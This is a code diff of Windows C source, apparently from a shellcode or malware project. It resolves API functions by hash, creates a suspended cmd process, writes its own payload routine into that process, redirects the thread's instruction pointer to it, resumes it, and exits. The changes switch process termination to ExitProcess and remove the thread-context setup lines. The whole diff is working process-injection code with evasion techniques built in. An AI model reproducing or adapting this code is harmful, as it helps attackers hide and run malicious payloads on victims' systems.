@@ -115,22 +115,13 @@ typedef DWORD(WINAPI *FuncResumeThread) (
 	_In_		HANDLE hThread
 	);
 
-typedef HANDLE(WINAPI *FuncGetCurrentProcess)(VOID);
-
-typedef BOOL(WINAPI *FuncTerminateProcess) (
-	_In_		HANDLE hProcess,
-	_In_		UINT uExitCode
-	);
+typedef VOID(WINAPI *FuncExitProcess) (
+	_In_ UINT uExitCode
+);
 
 VOID ExecutePayload(VOID);
 VOID forkProcess(VOID);
 VOID StartHere(VOID);
-
-//VOID StartHere(VOID)
-//{
-//	forkProcess();
-//	ExecutePayload();
-//}
 
 VOID ExecutePayload(VOID)
 {
@@ -207,14 +198,11 @@ VOID forkProcess(VOID)
 	FuncWriteProcessMemory MyWriteProcessMemory;
 	FuncSetThreadContext MySetThreadContext;
 	FuncResumeThread MyResumeThread;
-	FuncGetCurrentProcess MyGetCurrentProcess;
-	FuncTerminateProcess MyTerminateProcess;
-	FuncLoadLibraryA MyLoadLibraryA;
+	FuncExitProcess MyExitProcess;
 	STARTUPINFO StartupInfo;
 	PROCESS_INFORMATION ProcessInformation;
 	CONTEXT ctx;
 	LPVOID memBaseAddress;
-	HANDLE currentHandle;
 
 	// Declare strings
 	char cmdline[] = { 'c', 'm', 'd', 0 };
@@ -227,8 +215,6 @@ VOID forkProcess(VOID)
 #pragma warning(push)
 #pragma warning ( disable : 4055 ) // Ignore cast warnings
 
-	MyLoadLibraryA = (FuncLoadLibraryA)GetProcAddressWithHash(0x726774C);
-
 	// Load required APIs
 	MyCreateProcessA = (FuncCreateProcess)GetProcAddressWithHash(0x863FCC79);
 	MyGetThreadContext = (FuncGetThreadContext)GetProcAddressWithHash(0xD1425C18);
@@ -236,8 +222,7 @@ VOID forkProcess(VOID)
 	MyWriteProcessMemory = (FuncWriteProcessMemory)GetProcAddressWithHash(0xE7BDD8C5);
 	MySetThreadContext = (FuncSetThreadContext)GetProcAddressWithHash(0xD14E5C18);
 	MyResumeThread = (FuncResumeThread)GetProcAddressWithHash(0x8EF4092B);
-	MyGetCurrentProcess = (FuncGetCurrentProcess)GetProcAddressWithHash(0x51E2F352);
-	MyTerminateProcess = (FuncTerminateProcess)GetProcAddressWithHash(0x5ECADC87);
+	MyExitProcess = (FuncExitProcess)GetProcAddressWithHash(0x56A2B5F0);
 
 	// Create suspended process
 	MyCreateProcessA(0, cmdline, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &StartupInfo, &ProcessInformation);
@@ -259,9 +244,6 @@ VOID forkProcess(VOID)
 	// Write ExploitFunction to suspended process
 	MyWriteProcessMemory(ProcessInformation.hProcess, memBaseAddress, (LPCVOID)Begin, (DWORD64)forkProcess - (DWORD64)Begin, 0);
 
-	// Setup CONTEXT
-	ctx.ContextFlags = CONTEXT_FULL;
-
 	// Set EIP to new shellcode location
 	ctx.Rip = (DWORD64)memBaseAddress;
 #else
@@ -276,9 +258,6 @@ VOID forkProcess(VOID)
 	// Write ExploitFunction to suspended process
 	MyWriteProcessMemory(ProcessInformation.hProcess, memBaseAddress, (LPCVOID)ExecutePayload, (DWORD)forkProcess - (DWORD)ExecutePayload, 0);
 
-	// Setup CONTEXT
-	ctx.ContextFlags = CONTEXT_FULL;
-
 	// Set EIP to new shellcode location
 	ctx.Eip = (DWORD)memBaseAddress;
 #endif
@@ -289,9 +268,6 @@ VOID forkProcess(VOID)
 	// Resume the thread
 	MyResumeThread(ProcessInformation.hThread);
 
-	// Get Current process Handle
-	currentHandle = MyGetCurrentProcess();
-
-	// Terminate this process
-	MyTerminateProcess(currentHandle, (UINT)-1);
+	// Exit
+	MyExitProcess((UINT)-1);
 }
